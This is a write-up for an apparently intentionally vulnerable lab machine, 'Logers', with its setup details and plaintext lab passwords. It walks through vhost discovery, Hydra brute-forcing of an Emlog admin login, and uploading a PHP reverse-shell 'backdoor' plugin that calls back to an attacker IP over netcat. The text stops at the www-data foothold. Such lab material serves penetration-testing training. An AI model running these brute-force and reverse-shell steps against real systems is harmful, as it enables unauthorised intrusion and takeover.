# Logers

## Introduction

**Logers** is an Easy-rated Linux machine designed to demonstrate a realistic web application compromise followed by a custom privilege escalation technique.

The machine begins with enumeration of a publicly accessible web service hosting an **Emlog CMS** instance. Players must identify the correct virtual host, enumerate accessible resources, and obtain administrative access through a weak password that is intentionally crackable using the `rockyou.txt` wordlist. After authenticating, players exploit a vulnerable Emlog plugin upload functionality (CVE-2026-41517) to gain remote code execution.

Following the initial foothold, players must perform local enumeration to discover a backup configuration file containing credentials for a secondary system user. Finally, the machine concludes with a custom privilege escalation vulnerability involving insecure command execution inside a privileged maintenance script.

The machine focuses on the following skills:

* Linux enumeration
* Virtual host discovery
* Directory enumeration
* Password auditing with Hydra
* CMS exploitation
* PHP reverse shells
* Credential harvesting
* SSH access
* Sudo enumeration
* Command Injection
* Linux Privilege Escalation

---

# Info for HTB

## Access

### Passwords

| User        | Password                           |
| ----------- | ---------------------------------- |
| admin (CMS) | eminem                             |
| logging     | superlogging                       |
| root        | *ethicalhacker@logging* |

---

## Key Processes

### Nginx

Hosts the Emlog CMS website and is configured to serve the application only through the virtual host:

```
logers.htb
```

Direct access using the IP address returns a 404 response to encourage virtual host enumeration.

---

### PHP-FPM

Runs PHP 8.3 and executes the Emlog application.

---

### OpenSSH

Provides SSH access for the **logging** user after credentials are obtained from the backup configuration file.

---

### MySQL

Stores all Emlog CMS data including administrator credentials.

---

### Custom Privileged Script

```
/usr/local/bin/status_check.sh
```

The **logging** user is allowed to execute this script as root without a password.

The script contains an intentional command injection vulnerability which forms the intended privilege escalation path.

Source code is included with the submission.

---

## Automation / Crons

No cron jobs are required for the intended exploitation path.

No automated cleanup scripts are configured.

---

## Firewall Rules

No custom firewall rules are configured.

Only the intended services are exposed:

* TCP/22 (SSH)
* TCP/80 (HTTP)

---

## Docker

Docker is not used.

---

## Other

The machine intentionally requires virtual host discovery.

The web application is only accessible through:

```
logers.htb
```

Players are expected to add the hostname to their `/etc/hosts` file after discovering it during enumeration.

The administrator password is intentionally weak and is crackable within a few seconds using the `rockyou.txt` wordlist.

The privilege escalation vulnerability is a custom command injection inside a privileged maintenance script rather than a public GTFOBins technique.

---

# Writeup

This walkthrough documents the intended solution path for compromising the machine.

The attack path consists of four major phases:

1. Enumeration
2. Initial Foothold
3. Lateral Movement
4. Privilege Escalation

Every command shown below can be copied directly to reproduce the attack.

---

# Enumeration

The first step is to identify the services running on the target machine.

```bash
nmap -sC -sV 192.168.52.149
```

output:


![Nmap Scan](screenshots/01_nmap.png)


The scan reveals two services:

* SSH
* HTTP

The HTTP service also exposes a `robots.txt` entry indicating the existence of an administrative interface.

```
/admin/
```

---

## HTTP Enumeration

Browsing directly to the server IP does not expose the application.

![HTTP by IP](screenshots/02_ip.png)

This indicates that the application likely relies on a virtual host configuration.

Attempting to browse using the hostname initially fails because the local machine cannot resolve the domain.

![Hostname Failure](screenshots/03_domain_fail.png)

After adding the discovered hostname into `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Add:

```
192.168.52.149    logers.htb
```

![Hosts File](screenshots/04_hosts.png)

Browsing again successfully loads the Emlog CMS homepage.

![Homepage](screenshots/05_homepage.png)

---

## Directory Enumeration

Directory enumeration identifies several interesting endpoints.

```bash
gobuster dir \
-u http://logers.htb \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Interesting results include:


![Gobuster](screenshots/06_gobuster.png)


```
/admin
/content
/posts
/users
```

The `/admin` endpoint presents an administrator login panel.

![Admin Login](screenshots/07_login.png)

# Foothold

## Discovering the Login Parameters

Before attempting authentication, the login request was analyzed using the browser's Developer Tools.

After submitting test credentials, the POST request revealed the following parameters:

```text
POST /admin/account.php?action=dosignin

user=
pw=
```

![Login Request](screenshots/07_login.png)

Since the parameter names were identified successfully, the administrator password could now be audited.

---

## Brute Forcing the Administrator Password

The administrator username was inferred from the login page and default Emlog installation.

Using Hydra with the `rockyou.txt` wordlist quickly identifies the correct password.

```bash
hydra -l admin \
-P /usr/share/wordlists/rockyou.txt \
logers.htb \
http-post-form "/admin/account.php?action=dosignin:user=^USER^&pw=^PASS^:id=\"pw\""
```

Hydra successfully recovers the credentials.

```text
login: admin
password: eminem
```

![Hydra](screenshots/09_hydra.png)

The recovered credentials allow successful authentication into the administrator dashboard.

---

## Administrator Dashboard

After logging in, the administration panel becomes accessible. and identified the **Emlog Version 2.6.10**

One of the available features is **Plugin Management**, allowing administrators to upload custom plugins.

![Plugin Dashboard](screenshots/10_dashboard.png)

This functionality becomes particularly interesting after researching the installed version of Emlog.

---

## Vulnerability Research

Searching the installed Emlog version reveals a recently disclosed vulnerability.

```
CVE-2026-41517
```

The advisory describes an unrestricted plugin upload vulnerability which allows arbitrary PHP execution after uploading a crafted ZIP archive.

![CVE Advisory](screenshots/11_cve.png)

The proof of concept demonstrates that an attacker can create a malicious plugin containing PHP code and upload it through the administrator interface.

![Proof of Concept](screenshots/12_poc.png)

---

## Building a Malicious Plugin

A new plugin directory is created.

```bash
mkdir backdoor-plugin
cd backdoor-plugin
```

Inside the directory, a PHP reverse shell is placed.

```bash
nano backdoor-plugin.php
```

Instead of writing a shell manually, the widely used **PentestMonkey PHP reverse shell is used.**

The callback IP address is modified to match the attacker's machine.

```php
$ip = '192.168.52.140';
$port = 4444;
```

![Reverse Shell Configuration](screenshots/13_shell_edit.png)

The plugin directory is then archived.

```bash
cd ..
zip -r backdoor-plugin.zip backdoor-plugin
```

![ZIP Archive](screenshots/14_zip.png)

---

## Uploading the Plugin

Inside the administrator dashboard, navigate to:

```
Plugin
```

Click **Installing Plugins**.

![Plugin Upload](screenshots/15_upload_button.png)

Upload the malicious ZIP archive.

![Upload ZIP](screenshots/16_upload_zip.png)

The plugin uploads successfully without any validation, confirming the unrestricted upload vulnerability.

---

## Locating the Uploaded Plugin

To determine where the plugin has been extracted, enumerate the content directory.

```bash
dirb http://logers.htb/content/
```

Interesting directory:

```text
/content/plugins/
```

![DIRB](screenshots/17_dirb.png)

The uploaded plugin is located at:

```text
/content/plugins/backdoor-plugin/backdoor-plugin.php
```

---

## Triggering Remote Code Execution

Start a Netcat listener.

```bash
nc -lvnp 4444
```

Navigate to the uploaded plugin.

```
http://logers.htb/content/plugins/backdoor-plugin/backdoor-plugin.php
```

The browser returns a timeout because the PHP process is attempting to establish the reverse connection.

![Plugin Trigger](screenshots/18_trigger.png)

Meanwhile, the Netcat listener receives a connection.

```text
connect to [192.168.52.140] from [192.168.52.149]
```

Upgrade the shell to a fully interactive TTY.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

A stable shell is now obtained as the web server user.

```text
www-data@logers
```

![Reverse Shell](screenshots/19_www-data.png)

At this point, arbitrary commands can be executed on the target system.

